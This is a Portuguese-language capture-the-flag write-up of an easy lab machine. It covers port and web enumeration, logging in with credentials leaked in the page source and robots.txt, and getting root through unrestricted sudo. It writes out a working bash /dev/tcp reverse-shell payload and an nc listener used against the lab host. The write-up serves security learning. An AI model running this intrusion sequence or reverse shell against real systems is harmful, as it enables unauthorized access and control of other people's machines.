#easy #ctf
# Reconhecimento
Primeiramente devemos fazer um reconhecimento para tentarmos descobrir quais portas estão abertas, qual o OS e etc.

### Enumeração de portas
```sh
nmap 10.10.190.51 -sV -sC -A -Pn
```
![[Pasted image 20250218185817.png]]
`-sV` : Tenta enumerar versões de serviços.
`-sC` : Executa scripts padrão.
`-A` : Faz uma enumeração mais profunda.
`-Pn` : Não envia pacotes ICMP. Alguns hosts bloqueiam endereços que enviam esses pacotes.
### Código WEB
Identificamos duas portas abertas, **80(HTTP)** e **22(SSH)**. Podemos acessar a porta 80 via browser para ver o que tem lá.

![[Pasted image 20250218190428.png]]
Embora algumas mensagens engraçadas não vi nada de realmente útil aqui. Podemos tentar ver o código web pressionando `ctrl+u`.

![[Pasted image 20250218190655.png]]
Encontramos o usuário citado pelo Rick anteriormente: `R1ckRul3s`. Como já olhamos a página inicial, podemos então fazer uma enumeração WEB.
### Enumeração WEB
Devemos verificar quais pastas ou arquivos estão presentes no site, para isso fazemos uma enumeração na URL do site.

Temos que lembrar que o servidor que está rodando é o Apache que normalmente é usado com PHP. Podemos adicionar a extensão `.php` nas nossas tentativas.

```sh
ffuf -u http://10.10.190.51/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
```
![[Pasted image 20250218194911.png]]
`-u` : O site que vamos enumerar, devemos colocar a palavra `FUZZ` onde queremos que ele faça a enumeração.
`-w` : O caminho da lista de palavras que vamos usar.
`-e` : Alguma extensão que ele irá adicionar no final de cada palavra, podemos passar mais de uma separados por vírgula como: `.php,.js`

Agora que temos uma lista de recursos, podemos tentar acessa-los. Sempre começo pelo `robots.txt`, pois ele armazena as configurações de como os buscadores devem indexar o conteúdo.
###### /robots.txt
![[Pasted image 20250218195741.png]]
Nada demais, apenas o texto `Wubbalubbadubdub`, talvez seja útil .

---
# RCE
Temos outro recurso de nome interessante: `login.php`.
###### /login.php
![[Pasted image 20250218200328.png]]
Interessante, uma página de login, já temos um usuário fornecido na página inicial: `R1ckRul3s`, podemos tentar usar como senha o texto em `/robots.txt`: `Wubbalubbadubdub`.

![[Pasted image 20250218201821.png]]
Aparentemente podemos executar comandos por esse input, podemos colocar um reverse shell para testar se funciona.

Primeiro verifico meu IP da VPN.
```sh
ip addr
```
![[Pasted image 20250218202814.png]]

Então podemos começar a escutar uma porta escolhida para receber a conexão, no nosso caso a porta `4545`:
```sh
nc -lvnp 4545
```

Agora podemos mandar a nossa payload no input. 
![[Pasted image 20250218203112.png]]Payload : `bash -c 'bash -i >& /dev/tcp/10.9.238.50/4545 0>&1'`

![[Pasted image 20250218203154.png]]
Conseguimos, obtivemos um shell na máquina. E já conseguimos achar o arquivo com o primeiro ingrediente: `Sup3rS3cretPickl3Ingred.txt`

---
# PRIV ESC
Como nosso usuário é um usuário padrão, podemos tentar escalar o privilégio para um usuário com mais privilégios, mas primeiro devemos ver os nosso privilégios atuais.

Gosto de começar vendo quais comandos posso executar com `sudo`.
```sh
sudo -l
```
![[Pasted image 20250218203722.png]]
Por algum motivo, podemos executar qualquer comando como `root`, então nem precisaremos escalar nossos privilégios.

---
# Reconhecimento do OS
Podemos averiguar as pastas `home` de cada usuário para verificar se achamos algo.

```sh
ls /home/
```
![[Pasted image 20250218204230.png]]
```sh
ls /home/ubuntu/
ls /home/rick/
```
![[Pasted image 20250218204340.png]]
Encontramos o arquivo do segundo ingrediente: `second ingredients`

```sh
ls /root/
```
![[Pasted image 20250218204504.png]]
Achamos o arquivo do terceiro ingrediente: `3rd.txt`